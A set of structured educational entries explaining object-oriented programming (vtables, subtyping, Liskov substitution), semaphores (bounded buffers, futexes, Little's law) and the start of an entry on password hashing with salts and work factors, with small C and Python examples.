value: As programs grow past a few thousand lines, the hard problem is no longer writing a single algorithm. It is keeping the pieces apart so that people can change one without breaking the others. Object-oriented programming (OOP) attacks this with three linked ideas. Encapsulation: bundle data together with the functions that are allowed to change it, and hide the data, so that a rule such as "the balance is never negative" is enforced in one place. Polymorphism: let calling code use an object through a small interface ("something that can be drawn", "something that can store a key") without knowing which concrete type it is. Inheritance: let one class reuse and extend another.
The key mechanism is dynamic dispatch. When you call `shape.area()`, the program does not know at compile time which `area` to run; the object itself carries the answer, usually a hidden pointer to a table of function pointers (the vtable) for its class. This costs a couple of memory loads and an indirect jump, and in return the caller depends on the interface and not on the implementation. You can add a new `Hexagon` class and the existing drawing code works unchanged, and in tests you can pass a fake in place of a real database. The code is "open for extension, closed for modification".
Almost all large systems in industry are built this way: Java and C# are class-based by design, C++ adds classes to C, Python treats everything as an object, Scala mixes objects with functional programming, and frameworks such as Spring, Android and Django are object hierarchies. The layers below supply the theory. The type system (L3) checks that a call is valid for the object's declared type and defines when one type may stand in for another (subtyping). Type theory (L4) gives subtyping its precise rules, including why a function type is contravariant in its argument, which is the formal core of the Liskov substitution principle. Above, design patterns and SOLID are recipes built from objects, interfaces and composition.
terms: Class — a blueprint that defines the fields (data) and methods (functions) of a kind of object; in some languages (JavaScript, Self) objects are made from other objects instead.
Object — an instance of a class: a block of memory holding the fields, plus a link to its class's method table.
Encapsulation — hiding the fields behind methods so that other code cannot break the object's invariants.
Interface — a list of method signatures that a type promises to provide, with no implementation of its own.
Polymorphism — the ability to call the same method on different types and get type-specific behaviour.
Inheritance — defining a class as an extension of another, which reuses its fields and methods and may override some.
vtable (virtual table) — a per-class array of function pointers; an object holds a pointer (vptr) to its class's table, and a virtual call jumps through it.
Subtyping — the relation S <: T meaning a value of type S can be used wherever a T is expected.
Liskov substitution principle — a subtype must keep every promise of its supertype, so code written for T works unchanged for S.
history: The first object-oriented language was Simula 67, designed by Ole-Johan Dahl and Kristen Nygaard at the Norwegian Computing Center in Oslo (the first version, Simula I, is from 1962 to 1965). They were writing simulations of ships, queues and factories and wanted to model each real thing as a small program with its own state. Simula 67 introduced classes, objects, inheritance and virtual procedures. Alan Kay, who knew Simula, led the Smalltalk work at Xerox PARC in the 1970s (Smalltalk-72, then Smalltalk-80), made "everything is an object that receives messages" the rule, and popularised the term "object-oriented". Kay stressed message passing and late binding more than inheritance.
Two other lines mattered. Barbara Liskov's CLU (1974 to 1977) developed abstract data types: a type is defined by its operations, and the representation is hidden. Her 1987 keynote and the 1994 paper with Jeannette Wing gave the substitution principle that defines correct subtyping. Bjarne Stroustrup began "C with Classes" in 1979 and released C++ in 1985, adding Simula's classes and virtual functions to C while keeping C's speed; the vtable implementation of virtual calls comes from this design. Java (1995) brought single inheritance with interfaces, a virtual machine and garbage collection to a large audience.
By the 1990s, experience showed the limits. The "Gang of Four" book Design Patterns (1994) recorded recurring solutions and gave the advice "favour object composition over class inheritance", because deep inheritance trees had proved fragile. Newer languages kept objects but changed the rules: Go (2009) has no inheritance and uses interfaces satisfied by shape alone; Rust has traits and no classes; Kotlin and Scala make classes final or sealed by default; Python and JavaScript use duck typing. The core idea survived while the use of inheritance shrank.
how: Start with data. An object is a block of memory with its fields laid out one after another, like a C struct. If the class has any virtual methods, the compiler adds one hidden field at the start: the vptr, a pointer to the class's vtable. For a class `Circle` with a field `r` and virtual methods `area` and `draw`, an object in memory looks like [vptr | r]. The vtable for `Circle` is a static array in read-only memory: [&Circle::area, &Circle::draw]. The class `Square` has its own vtable with its own functions in the same slots, because both implement the interface `Shape` which fixes slot 0 as `area` and slot 1 as `draw`.
A virtual call `s->area()` compiles to three steps: load the vptr from the object, load the function pointer at slot 0 of that table, and call it indirectly with the object's address as the hidden `this` argument. This costs two dependent memory loads and an indirect branch. When the tables and code are in cache and the branch predictor guesses right, that is about 1 to 3 ns. If the target changes unpredictably from call to call, the indirect branch is mispredicted and costs 15 to 20 cycles. The larger loss is that the compiler cannot inline a call whose target it does not know, so it cannot optimise across the call.
Inheritance is then a layout rule. A derived class `ColoredCircle : Circle` starts with the same bytes as `Circle` ([vptr | r | color]), and its vtable begins with the same slots, with overridden entries pointing to the new functions. So code that expects a `Circle*` works on a `ColoredCircle*` without any conversion: the fields it uses are at the same offsets and the calls land on the right functions. This is the mechanical meaning of subtyping. With multiple inheritance, the object holds several vptrs and the compiler adjusts the `this` pointer when converting between base types, which is why it is more complicated.
Other languages vary the mechanism. Java compiles to `invokevirtual` (a vtable slot by class) and `invokeinterface` (a lookup in an interface table, because a class may implement many interfaces). The JIT compiler watches which classes actually reach each call site: if only one class is seen, it inlines the method with a cheap type check; with two, it inlines both; only highly varied ("megamorphic") sites use the full table call. This is why Java virtual calls are often free in practice. Go represents an interface value as two words, a pointer to an "itab" (the method table for this pair of interface and concrete type) and a pointer to the data; the compiler builds the itab when a concrete value is converted to an interface. Python and JavaScript have no fixed vtable: a method call looks the name up in the object's dictionary, then in its class and its parent classes in a defined order (the method resolution order), with caches to make this fast.
The type system's part is to decide what is allowed. The compiler checks that the receiver's static type has the method (`Shape` has `area`), and that an assignment `Shape s = new Circle()` is legal because `Circle <: Shape`. Subtyping has precise rules in type theory. For function types the rule is
\[ (A \to B) \;<:\; (A' \to B') \quad \text{iff} \quad A' <: A \;\text{ and }\; B <: B' \]
so an overriding method may accept more general arguments (contravariance) and return more specific results (covariance). A method that demands a narrower argument than the original breaks substitution, because callers written for the base type may pass a value the override cannot handle. This is the same idea as the Liskov principle, written as a type rule. Mutable containers add a trap: treating a list of `Circle` as a list of `Shape` is unsafe, since a `Square` could then be inserted. Java arrays allow it anyway and check at run time (`ArrayStoreException`).
Encapsulation is enforced by access control (`private`, `protected`) and by the discipline of keeping invariants inside methods. The point is that a class has a small set of operations that preserve its rules; no outside code writes the fields directly. This reduces the number of places that can break an invariant to the methods of one class.

example: Implement the mechanism by hand in C to see there is no magic. A `Shape` interface has two operations, and two concrete types fill the table:
```c
#include <stdio.h>
typedef struct Shape Shape;
typedef struct {
    double (*area)(const Shape *);     /* slot 0 */
    const char *(*name)(const Shape *);/* slot 1 */
} ShapeVT;
struct Shape { const ShapeVT *vt; };   /* object starts with vptr */

typedef struct { Shape base; double r; } Circle;
typedef struct { Shape base; double w, h; } Rect;

static double circle_area(const Shape *s)
    { return 3.14159 * ((Circle *)s)->r * ((Circle *)s)->r; }
static double rect_area(const Shape *s)
    { return ((Rect *)s)->w * ((Rect *)s)->h; }
static const char *circle_name(const Shape *s) { return "circle"; }
static const char *rect_name(const Shape *s) { return "rect"; }

static const ShapeVT circle_vt = { circle_area, circle_name };
static const ShapeVT rect_vt   = { rect_area, rect_name };

int main(void) {
    Circle c = {{&circle_vt}, 2.0};
    Rect   r = {{&rect_vt}, 3.0, 4.0};
    Shape *all[] = { (Shape *)&c, (Shape *)&r };
    for (int i = 0; i < 2; i++)
        printf("%s %.2f\n", all[i]->vt->name(all[i]),
               all[i]->vt->area(all[i]));
}
```
The output is "circle 12.57" and "rect 12.00". The loop knows only `Shape`. The call `all[i]->vt->area(all[i])` is exactly the three steps of a virtual call. Adding a `Triangle` means adding a struct, two functions and a table; the loop does not change. A C++ or Java compiler writes all of this for you and checks the types.
Now a design example with numbers. A checkout service takes payments through an interface `PaymentGateway { charge(amount, token) }`, with implementations for two providers and a `FakeGateway` for tests. The service code has one `gateway.charge(...)` call. Moving from provider A to provider B means changing one line where the object is constructed. Tests run in microseconds with the fake and need no network. The price of this indirection is one virtual call per payment (a few nanoseconds), and a network call costs about 100 million times more, so the dispatch cost is irrelevant here.
It matters in other places. Suppose a physics engine updates 1,000,000 entities in a loop, each by a virtual `update()` call, and the objects are scattered in memory. Each call is a likely cache miss (about 80 ns for main memory) plus an indirect branch, so a pass costs on the order of 50 to 100 ms. Storing the same data as plain arrays by type and looping over each array (a data-oriented layout) turns the pass into sequential reads that take a few milliseconds. This is why game engines and database kernels often do not use per-object virtual calls on their hot paths.
intuition: An interface is a wall socket: the appliance only needs the shape of the plug, and any power source that fits can be plugged in behind the wall.
OOP is natural because large programs fail at their joints. If every part may read and write every other part's data, a change anywhere can break anything. Putting data behind a small set of operations makes the joints explicit. Dynamic dispatch then lets one side of a joint be replaced without the other side knowing. The vtable is a small, cheap way to postpone the choice of code until run time, and the type system's job is to make sure the postponed choice is always safe.
mistakes: People often think OOP means using inheritance for code reuse. In fact inheritance is the most tightly coupled form of reuse, because a subclass depends on the parent's internal details (the "fragile base class" problem: a change in the parent can silently break children). Most reuse is better done by composition, where an object holds another object and calls it through an interface.
People often think a subclass is correct if it compiles. In fact the compiler checks signatures, not promises. A `Square` that extends `Rectangle` and makes `setWidth` also change the height compiles, but code that sets width and height separately and then expects `width × height` gets the wrong area. The Liskov substitution principle requires that behaviour, not only types, is compatible. "Is-a" in the real world is not always "can substitute" in code.
People often think virtual calls are always slow. In fact a predictable virtual call costs a few nanoseconds, and JIT compilers and modern compilers devirtualise many of them: Java inlines monomorphic sites, C++ compilers do so when the type is known (`final` classes, link-time optimisation, profile-guided optimisation). The cost is real only in hot loops over many types and scattered memory, where the lost inlining and cache misses add up.
People often think OOP and functional programming are opposites. In fact they address different questions and are mixed in practice. Scala, Kotlin, Swift and modern Java use immutable objects, interfaces and lambdas together. A closure is an object with one method, and an object is a bundle of closures over shared state.
People sometimes think "getters and setters for every field" is encapsulation. In fact exposing each field through a trivial getter and setter hides nothing. Encapsulation means offering operations that keep the object valid (`account.withdraw(100)`), not a window onto its fields.
friction: Inheritance hierarchies decay. Deep trees mix unrelated reasons to change, subclasses override in ways the base class never expected, and "the banana, the gorilla and the whole jungle" problem appears: you want a banana but the object comes with all its parents and their dependencies. The diamond problem in multiple inheritance (two parents with the same grandparent) forces languages to adopt rules (C++ virtual bases, Python's C3 linearisation) or to forbid it (Java classes, with interfaces and default methods as the compromise).
Mutable state hidden inside objects makes concurrent programs hard. Encapsulation does not make an object thread-safe; two threads calling methods on one object can still break its invariants unless it is synchronised or immutable. Object graphs also create aliasing: two objects referencing one third object, each assuming it can change it. Equality, copying and serialisation of object graphs need thought (shallow versus deep copy, identity versus value equality).
Performance has hidden costs. Objects are usually allocated on the heap with a header (12 to 16 bytes in a typical JVM object), referenced by pointer, and scattered in memory; a `List<Point>` of a million points in Java is a million separate allocations and pointer chases, versus a few contiguous arrays in a data-oriented layout. Virtual calls block inlining, and object-heavy code can create many short-lived allocations that stress the garbage collector. Java's value classes (project Valhalla) and C# structs aim to reduce this.
Finally, the model fits some domains badly. Data pipelines, query engines and business rules are often easier as plain data plus functions, and "anemic" classes with only getters and setters add ceremony. Adding a new operation across many classes (the "expression problem") is awkward in OOP, where adding a new type is easy; it is the reverse in functional style. Choosing the right axis of extension is a design decision, not a default.
practice: Program to interfaces at the boundaries that may change: persistence, external services, clocks, random sources and anything you want to fake in tests. Inside a module, a plain class or a function is often enough; do not create an interface for every class. Keep classes small and cohesive: if you cannot name what a class is responsible for without using "and", split it.
Prefer composition and delegation to inheritance. Use inheritance for real "is-a" relations that satisfy Liskov, usually one level deep and with an abstract base or an interface at the top. Mark classes `final` (Java, C++, Kotlin default) when they are not designed for extension, and in C++ make base class destructors virtual. Make objects immutable when you can (value objects, records, `@dataclass(frozen=True)`), because they are safe to share between threads and easy to reason about.
Hide fields, expose behaviour; check invariants in constructors so that an invalid object cannot exist. Prefer dependency injection (pass collaborators in through the constructor) so the class does not construct its dependencies and tests can substitute fakes. Avoid deep inheritance trees in frameworks you control; if the framework forces them (Android, Django), keep your own logic in plain classes that the framework classes call.
Measure before worrying about dispatch cost. In Java, check JIT behaviour with `-XX:+PrintInlining` if a hot path matters; in C++, `final` and `-flto -fprofile-use` help; in hot loops over many items, store data by type in arrays. In Python, remember that method calls are dictionary lookups and objects carry a per-instance dict unless you use `__slots__`.
tradeoffs: Inheritance versus composition. Choose inheritance when the child truly is a specialised version of the parent, the parent is designed for extension and stable, and the hierarchy stays shallow. Choose composition when you only want to reuse behaviour, when the set of behaviours varies independently (strategy objects), or when you cannot control the parent class. You pay a few forwarding methods with composition; with inheritance you pay in coupling.
Virtual dispatch versus generics (templates, monomorphisation). Choose interfaces and virtual calls when the concrete type is chosen at run time, plugins are loaded dynamically, or code size matters. Choose generics with static dispatch (C++ templates, Rust generics) when the type is known at compile time and the call is hot, because each instantiation can be inlined. The cost is larger binaries and longer compile times, and you cannot hold a mixed list of types without extra work.
Open set of types versus closed set. Choose classes and interfaces when new types will be added by others and operations are stable (plugin systems, drivers). Choose sum types / tagged unions with pattern matching (Rust enums, Scala sealed traits, Java sealed interfaces) when the list of cases is fixed and you will add new operations often. With sealed types the compiler can check that every case is handled.
Objects versus data-oriented layout. Choose objects for application and domain logic where clarity and change matter more than speed. Choose arrays of plain data processed in bulk (struct-of-arrays, entity-component systems, columnar formats) when you handle millions of items per pass and memory access dominates. You give up easy abstraction and pay in less readable code.
Mutable versus immutable objects. Choose mutable objects for large, frequently updated state with a single owner (a buffer, a connection). Choose immutable value objects for shared data, map keys and anything crossing threads. Immutability costs allocation when updates are frequent; mutation costs safety and needs locking.

@@ semaphores
value: A lock lets one thread at a time into a critical section. Many real problems need a different rule: let at most N in (ten database connections, four GPU slots, one hundred in-flight requests), or make one thread wait until another has produced something. A semaphore is the simplest tool for both. It is a counter of permits with two operations. `acquire` (Dijkstra's P) takes a permit, and if the counter is zero it blocks the caller. `release` (V) returns a permit and wakes one waiting thread if there is one. The counter is never negative, and a blocked thread uses no CPU.
With a semaphore set to 1 you get a lock. With a semaphore set to N you get a limit on concurrency. With a semaphore set to 0 you get a signal: one thread calls `acquire` and sleeps until another calls `release`. Combine two of them with a buffer and you get the bounded buffer (producer–consumer queue), the basic shape behind thread pools, pipelines, connection pools and every queue that must not grow without limit. A bounded queue gives back-pressure: when the consumer is slow, the producer is made to wait instead of the queue filling all of memory.
The layers below supply every part. Locks and atomics (L3) provide the indivisible update of the counter: a semaphore is a counter protected by mutual exclusion, and its fast path is a single atomic compare-and-swap. Condition variables and monitors (L3) provide the blocking and waking. CPU scheduling (L3) takes a blocked thread off the run queue and puts it back when it is woken, which is why waiting is free of CPU cost, and why fairness and priority matter. Queueing theory (L4) explains why a bound is needed and what it does to latency and throughput through Little's law. Proofs and induction (L4) give the method to show a semaphore program correct: an invariant that holds after every step. Above, channels in Go, thread pools, rate limiters and concurrency limits are semaphores in disguise.
terms: Semaphore — an integer counter with atomic `acquire` (wait, P) and `release` (signal, V) operations; acquire blocks while the counter is zero.
Permit — one unit of the counter; holding a permit means the right to use one unit of the resource.
Binary semaphore — a semaphore whose value is only 0 or 1; it behaves like a lock that any thread may release.
Counting semaphore — a semaphore with a larger maximum, used to limit access to N identical resources.
Mutex — a lock with an owner: only the thread that locked it may unlock it. A semaphore has no owner.
Bounded buffer — a queue of fixed capacity N in which producers wait when it is full and consumers wait when it is empty.
Invariant — a statement that is true before and after every operation; for a semaphore: value = initial + releases − completed acquires, and value ≥ 0.
Strong (fair) semaphore — one that wakes waiters in first-in, first-out order; a weak semaphore wakes an arbitrary waiter.
Futex — a Linux kernel facility ("fast user-space mutex") that lets a user-space atomic variable be waited on and woken, used to implement semaphores and locks cheaply.
history: Edsger Dijkstra invented the semaphore in 1962 to 1965 while building multiprogramming systems at the Technological University of Eindhoven. His note EWD123, "Cooperating Sequential Processes" (1965), defines the primitives with the Dutch names P (from "proberen", to test, or "passeren", to pass) and V (from "verhogen", to increase, or "vrijgeven", to release). The idea came from railway signals: a semaphore is the arm that is either up (stop) or down (go). The THE multiprogramming system (1968) used semaphores for synchronisation and for the producer–consumer pattern between processes and I/O devices.
Semaphores solved a real problem: before them, programmers coordinated processes with busy-waiting loops or with ad hoc flags that were wrong in subtle ways. Dijkstra showed that two simple operations, together with a clear invariant, were enough to build mutual exclusion, resource pools, and ordered handshakes, and he used the bounded buffer to show how to reason about it. The dining philosophers problem, from the same period, became the standard test of any synchronisation tool.
Experience then showed that semaphores are hard to use at scale: they are low-level, any thread can signal, and a missing or misplaced call causes deadlock or a lost wakeup. Tony Hoare's monitors (1974) and Per Brinch Hansen's work packaged a lock with condition variables to make the structure explicit, and mutexes took over mutual exclusion. Semaphores stayed for counting: POSIX semaphores (1003.1b, 1993), `java.util.concurrent.Semaphore` (Java 5, 2004), Windows semaphores, and Linux futexes (2003) that made the common case almost free. In Go, a buffered channel serves the same purpose, and the cloud era brought the same idea to distributed systems as concurrency limits and bulkheads.
how: A semaphore holds an integer `count` (the number of free permits) and a queue of waiting threads. The two operations are defined so that each runs as one indivisible step.
Step 1: `acquire`. If `count > 0`, decrement it and continue. Otherwise, put the calling thread on the semaphore's wait queue and block it (the scheduler removes it from the run queue; it uses no CPU).
Step 2: `release`. If a thread is waiting, wake one of them and hand it the permit directly (the count stays unchanged). If none is waiting, increment `count`.
Step 3: the correctness argument is an invariant, proved by induction over the sequence of operations: `count = initial + (completed releases) − (completed acquires)`, and `count ≥ 0`. Initially it holds. Each acquire that completes reduces the right side by one and the left side by one (the guard guarantees it never goes below zero); each release raises both by one. Because the invariant holds at every step, at most `initial` threads can be between a completed acquire and its matching release. With `initial = N` this is exactly "at most N threads inside".
The indivisibility comes from the layers below. A simple implementation uses a lock and a condition variable (the condvars concept): lock a mutex, `while (count == 0) wait(cond, mutex)`, `count--`, unlock. For release: lock, `count++`, `signal(cond)`, unlock. The `while` loop is essential, because a woken thread must recheck the count; another thread may have taken the permit first. A production implementation avoids the lock in the common case. Linux's futex approach keeps `count` in a 32-bit word in user space. `acquire` tries an atomic compare-and-swap to decrement it; if it succeeds, no system call is made (tens of nanoseconds). Only if the count is zero does the thread call `futex_wait`, and only a `release` that sees waiters calls `futex_wake`. So an uncontended semaphore costs about the same as an atomic operation, and the kernel is involved only when threads actually must sleep or wake.
Blocking and waking go through the scheduler. A thread that blocks moves from running to waiting; the kernel switches to another ready thread (a context switch of a few microseconds). `release` makes the waiter ready, but it may not run at once; the scheduler decides when. This has two consequences. First, wake-up latency is part of the cost of contended semaphores (often 5 to 50 microseconds, longer under load). Second, fairness and priority are scheduler questions: a strong semaphore uses a FIFO queue so that no thread waits forever, while a weak one can starve a thread. A low-priority thread holding a permit that a high-priority thread needs can invert priorities, which real-time systems fix with priority inheritance (this is why Mars Pathfinder had resets in 1997; the bug involved a mutex, the same mechanism).
Now the bounded buffer, the classic use. A buffer holds up to N items. Use three things: a mutex for the buffer's internal structure, a semaphore `empty` initialised to N (free slots), and a semaphore `full` initialised to 0 (filled slots). The producer does `empty.acquire()`, then adds the item under the mutex, then `full.release()`. The consumer does `full.acquire()`, removes an item under the mutex, then `empty.release()`. The two semaphores count the two kinds of resources: `empty + full = N` at rest. A producer sleeps when there are no free slots; a consumer sleeps when there are no items. Neither polls. The queueing theory behind it: if producers are faster than consumers on average, an unbounded queue grows without limit (the queue length tends to infinity as utilisation reaches 1). The bound turns that into waiting on the producer side, which is back-pressure.
The same structure generalises. A thread pool is a bounded queue of tasks plus N worker threads. A connection pool is a semaphore with N permits plus a list of connections. A concurrency limiter (`Semaphore(100)` in front of a service call) bounds the number of in-flight requests, and by Little's law (average number in the system equals arrival rate times average time in the system) it also bounds throughput: at most N / W requests per second, where W is the time each holds a permit. A Go buffered channel `make(chan struct{}, N)` is exactly this: sending acquires a slot, receiving releases it.

example: Build a bounded buffer with capacity N = 2 and follow it step by step. State: `empty = 2`, `full = 0`, buffer `[]`.
The producer P1 produces item A: `empty.acquire()` makes `empty = 1`; A is put in the buffer; `full.release()` makes `full = 1`. The state is `[A]`, empty 1, full 1. P1 produces B: `empty = 0`, buffer `[A, B]`, `full = 2`. P1 now produces C: `empty.acquire()` finds 0 and blocks. P1 sleeps and uses no CPU. This is back-pressure.
The consumer C1 starts. `full.acquire()` makes `full = 1`; it takes A; `empty.release()` finds P1 waiting and wakes it, handing it the permit (so `empty` stays 0 for a moment, then P1 takes it). The buffer is `[B]`; P1 puts C in: `[B, C]`. At every step `empty + full` plus the number of items in transit equals 2, which is the invariant that proves the buffer never holds more than 2.
Here is the code in Python, with the wrong order shown as a comment:
```python
import threading, collections

N = 4
buf = collections.deque()
mutex = threading.Lock()
empty = threading.Semaphore(N)    # free slots
full = threading.Semaphore(0)     # filled slots

def put(item):
    empty.acquire()               # wait for a free slot FIRST
    with mutex:                   # only then take the lock
        buf.append(item)
    full.release()

def get():
    full.acquire()
    with mutex:
        item = buf.popleft()
    empty.release()
    return item
# Bug: taking `mutex` before `empty.acquire()` deadlocks when the
# buffer is full: the producer sleeps holding the mutex and the
# consumer can never get in to remove an item.
```
Now a concurrency limit with numbers. A service calls a database with a pool of 20 connections and each query takes 10 ms. Each connection can complete 100 queries per second, so the pool can do at most 20 × 100 = 2,000 queries per second (Little's law: 20 in flight / 0.010 s). If 200 request threads share the pool and all want to query at once, a `Semaphore(20)` makes 180 of them wait. With a 4,000 requests per second load, the queue grows without bound, so you also need a time limit on the wait (`tryAcquire(timeout)`) and then shed load, instead of letting latency grow to many seconds. If a slow query takes 500 ms, 20 permits last only 40 queries per second, a good reason to separate pools for slow and fast work (a bulkhead).
intuition: A semaphore is a coat-check desk with N hooks: you take a hook if one is free, wait in line if none is, and every returned coat lets the next person in line go.
It is natural because "wait until a resource is available" and "tell someone it is ready" are the same event seen from two sides: a counter moving up and down, with sleeping instead of spinning when it cannot move. A single integer plus a queue is enough to express locks, limits, signals and buffers. The invariant that the count never goes below zero is the whole safety argument, and because it is simple, it can be checked by hand.
mistakes: People often think a semaphore with one permit is the same as a mutex. In fact a mutex has an owner: only the thread that locked it may unlock it, and the system can use that for priority inheritance, recursion and error checking. A binary semaphore can be released by any thread, so a stray `release` can let two threads in. Use a mutex for mutual exclusion, and a semaphore for counting and signalling.
People often think `release` before `acquire` is an error. In fact a semaphore remembers permits, so a signal sent before the waiter arrives is not lost; the later `acquire` passes at once. This is different from a condition variable, where a signal with no waiter is lost. The memory of the counter is why semaphores are good for handshakes.
People often think that a semaphore guarantees fairness. In fact many implementations are weak: a thread that releases and immediately re-acquires can barge ahead of waiting threads and starve them. Java's `Semaphore(permits, true)` is FIFO, at some cost in throughput. Check what your library promises.
People often think bounding concurrency always reduces latency. In fact a limit moves the waiting from inside the service to the queue in front of it. It protects the downstream and keeps latency stable for those admitted, but total waiting still exists. Without also limiting the queue and the wait time, you only create a long queue of timed-out requests.
People often think forgetting `release` is a small leak. In fact each missed release permanently removes a permit; after N missed releases (often on an exception path) the semaphore is stuck at zero and every caller blocks forever. Always release in a `finally` block or with `with`/`defer`.
friction: Semaphores are low-level and easy to misuse. The order of operations matters (the mutex-before-empty deadlock above), nothing in the type system links an `acquire` to its `release`, and an exception between them leaks a permit. The program's correctness lives in a global invariant that no tool checks. This is why monitors, channels, structured concurrency, and `try-with-resources` patterns are preferred where available.
Deadlock and starvation remain. Two semaphores acquired in opposite orders by two threads deadlock. A thread that waits for a permit while holding another resource (a lock, a database transaction) can block everything behind it: with a pool of 20 and each task needing 2 permits, 20 tasks can each take one permit and wait forever for the second. Priority inversion is possible if a low-priority thread holds a permit. Debugging is hard because a blocked thread shows only that it is in `acquire`, not who owns the permits (there is no owner).
Performance has limits too. Under heavy contention many threads wake, run briefly and sleep again (the "thundering herd"), and each wake-up costs a context switch. A single global semaphore becomes a contended cache line; sharded or per-CPU counters scale better but weaken exactness. Semaphores also limit only the number of holders, not the rate of work; to limit requests per second you need a token bucket.
In distributed systems, a local semaphore does not limit a fleet. 50 instances each with Semaphore(100) allow 5,000 concurrent calls to a shared database. A distributed limit needs a shared counter or lease service with failure handling, because a crashed holder never releases its permit, and then you must use timeouts or leases.
practice: Use a semaphore for three jobs: bounding concurrency (calls to a service, open files, memory-heavy tasks), signalling between threads (one-time handshake: start at 0, one side releases), and implementing bounded queues when your library has no ready-made one. Prefer the ready-made structure when available: `ArrayBlockingQueue`/`LinkedBlockingQueue` in Java, `queue.Queue(maxsize=N)` in Python, `asyncio.Queue(maxsize)`, a buffered channel in Go, `ThreadPoolExecutor` with a bounded queue.
Always pair acquire and release in a structured way: `try { sem.acquire(); ... } finally { sem.release(); }`, Python `with sem:` or `async with sem:`, Go `defer func(){ <-sem }()`. Use a timeout on acquire (`tryAcquire(100, MILLISECONDS)`, `asyncio.wait_for`) and define what happens on timeout: reject the request quickly (HTTP 503 with Retry-After) so overload does not turn into a long queue.
Size the limit with Little's law: permits ≈ target throughput × time each holder keeps the permit. For a database, size the pool a bit above the CPU and I/O capacity of the database, not the number of client threads. Separate pools for different work classes (bulkheads) so one slow dependency cannot take all permits. Measure the number of permits in use, the wait time for `acquire`, and the queue length, and alert when wait time rises.
Take a lock-ordering rule when more than one semaphore or lock is involved, and never block on a semaphore while holding a lock that the releaser needs. In async code, use the async semaphore (`asyncio.Semaphore`), because a thread semaphore would block the event loop. For limits across processes or machines, use an external mechanism (Redis-based or database-based leases with expiry) and accept that exactness is hard.
tradeoffs: Semaphore versus mutex. Choose a mutex for protecting a critical section: it has an owner, supports priority inheritance and is simpler to reason about. Choose a counting semaphore when the resource has N units or when one thread signals another; you give up ownership checks, so mistakes are harder to detect.
Semaphore versus condition variable with a lock. Choose a semaphore when the condition is "a count is positive" (permits, items, slots), because the counter remembers signals and the code is short. Choose a monitor with condition variables when the condition is complex (queue empty and shutdown not requested, or a priority rule), which a single counter cannot express. You pay with more code and the need to recheck conditions in a loop.
Bounded versus unbounded queues. Choose bounded when producers can be slowed, memory is limited, or you want the system to fail fast under overload; pick the bound from latency budget × throughput (for 2,000 requests per second and a 50 ms budget, about 100 items). Choose unbounded only where the producer rate is guaranteed below the consumer rate, or when dropping data is worse than using memory. An unbounded queue turns overload into out-of-memory errors and huge latency.
Blocking versus fail-fast acquire. Block (with a timeout) for internal batch work where waiting is fine. Use `tryAcquire` and reject for user-facing requests, where an immediate error beats a slow response. You give up some success rate for stable latency.
Fair versus unfair semaphore. Choose fair (FIFO) when starvation is unacceptable, such as multiple tenants sharing a pool; it can cut throughput by a noticeable share because of forced hand-offs. Choose unfair when throughput matters and every waiter is equivalent, as in a worker pool.
interview: Implement a bounded blocking queue using semaphores, and explain why the order of operations matters. || Use `empty = Semaphore(N)`, `full = Semaphore(0)` and a mutex. put: `empty.acquire()`, lock, insert, unlock, `full.release()`. get: `full.acquire()`, lock, remove, unlock, `empty.release()`. What is the difference between a binary semaphore and a mutex, and when does it matter? || A mutex has an owner and may support priority inheritance and recursion; a binary semaphore does not, and any thread can release it. It matters for priority inversion in real-time systems, for detecting unlock-by-wrong-thread bugs, and when one thread signals another, where the semaphore is the right fit.

Use a smaller per-instance limit, a shared or adaptive limit (for example based on latency), circuit breakers, and back-pressure from the downstream.
How does a semaphore avoid a system call when uncontended? || It keeps the count in a user-space atomic word. `acquire` does a compare-and-swap decrement; if successful, no kernel call is needed. Only when the count is zero does it call futex wait, and release calls futex wake only if waiters are recorded. Cost is tens of nanoseconds in the fast path.
Explain how Little's law relates to sizing a semaphore. || Average in-flight work L equals throughput λ times time-in-system W. With permits P as the cap on L, max throughput is P / W. To reach 5,000 requests per second with 20 ms holding time you need at least 5,000 × 0.02 = 100 permits, plus margin for variance.
A thread pool task acquires one permit and then submits a sub-task that also needs a permit from the same pool. What can happen? || If all permits are taken by parents waiting for children, no child can ever get a permit: deadlock (thread-pool starvation). Use separate pools, do not wait inside a task for a task of the same pool, or acquire all required permits atomically.
quiz: What are the two semaphore operations and what does each do? || `acquire` (P, wait) decrements the counter, or blocks while it is zero. `release` (V, signal) increments the counter, or wakes one blocked waiter, handing it the permit.
Why must a thread blocked in `acquire` recheck the count after waking when the semaphore is built from a condition variable? || Another thread may have taken the permit between the wake-up and the lock being re-acquired, or the wake-up was spurious. A `while` loop re-tests the condition.

value: A website must check a password without keeping it. If the database stores passwords in plain text, one leak (a stolen backup, a SQL injection, an unhappy employee) exposes every account, and people reuse passwords on other sites. The first fix is to store a hash: a one-way function of the password. At login, hash what the user typed and compare. But an ordinary fast hash such as SHA-256 or MD5 is built to be quick, and that is exactly what an attacker wants. A single modern graphics card (GPU) computes more than 20 billion SHA-256 hashes per second, and human-chosen passwords come from a small, predictable set, so a stolen table of fast hashes is cracked in hours.
Password hashing functions (bcrypt, scrypt, Argon2, PBKDF2) change the economics. They are deliberately slow and, in the better designs, memory-hungry. A good setting makes one guess cost about 100 to 500 ms of CPU and tens of megabytes of memory for the honest server, which is invisible to a user logging in once. For an attacker who must try billions of guesses, the same cost turns into years of hardware. A random per-user salt, stored next to the hash, makes every user's hash different, so one precomputed table or one pass of guessing cannot attack all users at once.
The mechanism rests on three lower layers. Cryptographic hash functions (L3) are the building block that is one-way and looks random. The birthday bound (L4) shows how long a salt must be so that two users never get the same one by chance. Combinatorics (L4) measures the guess space: the number of possible passwords, alphabet size to the power of length, divided by the guess rate, gives the attacker's time. Authentication systems above (sessions, SSO, passkeys) and security architecture rely on this to limit the damage of a database leak. The idea is also a rare case where we want a function to be slow, and to waste memory, on purpose.
terms: Salt — a random value, unique per password, stored in the clear next to the hash and mixed into the hashing, so equal passwords give different hashes.
Work factor (cost) — a tunable parameter (iterations, rounds) that sets how slow one hash is.
Memory-hard function — a function that needs a large amount of memory to compute quickly, so parallel hardware (GPUs, ASICs) loses its advantage.
Rainbow table — a precomputed table that maps hash values back to passwords for a fixed hash function; defeated by salts.
Brute force / dictionary attack — trying candidate passwords one by one, either all strings or a ranked list of likely passwords (leaked lists, words with common edits).
Key stretching — repeating or enlarging the hash computation so that each guess costs more.
Pepper — a secret key, stored outside the database (in an HSM or secret manager), mixed into the hash so that a stolen database alone is not enough.
PHC string — the standard text form `$id$params$salt$hash` that stores the algorithm, parameters and salt together with the hash.
Constant-time comparison — comparing two values in a way whose timing does not depend on where they differ.
